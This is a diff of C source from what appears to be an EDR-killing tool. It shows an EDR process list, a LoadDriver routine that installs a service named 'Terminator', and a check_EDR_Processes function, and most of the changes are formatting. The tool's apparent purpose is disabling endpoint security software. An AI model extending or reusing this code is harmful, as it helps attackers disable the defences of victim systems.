@@ -115,7 +115,7 @@ int edrlist_size = sizeof(edrlist) / sizeof(edrlist[0]);
 BOOL
 LoadDriver(
     char* driverPath
-){
+) {
     SC_HANDLE hSCM, hService;
     const char* serviceName = "Terminator";
 
@@ -197,39 +197,7 @@ LoadDriver(
     return (0);
 }
 
-
-
-BOOL
-CheckProcess(
-    DWORD pn
-){
-    DWORD procId = 0;
-    HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
-
-    if (hSnap != INVALID_HANDLE_VALUE)
-    {
-        PROCESSENTRY32 pE;
-        pE.dwSize = sizeof(pE);
-
-        if (Process32First(hSnap, &pE))
-        {
-            if (!pE.th32ProcessID)
-                Process32Next(hSnap, &pE);
-            do
-            {
-                if (pE.th32ProcessID == pn)
-                {
-                    CloseHandle(hSnap);
-                    return (1);
-                }
-            } while (Process32Next(hSnap, &pE));
-        }
-    }
-    CloseHandle(hSnap);
-    return (0);
-}
-
-char* 
+char*
 to_lowercase(
     const char* str
 )
@@ -242,7 +210,7 @@ to_lowercase(
     return lower_str;
 }
 
-int 
+int
 is_in_edrlist(
     const char* pn
 )
@@ -260,11 +228,11 @@ is_in_edrlist(
     return (0);
 }
 
-DWORD 
+DWORD
 check_EDR_Processes
 (
     HANDLE hDevice
-){
+) {
     unsigned int procId = 0;
     unsigned int pOutbuff = 0;
     DWORD bytesRet = 0;
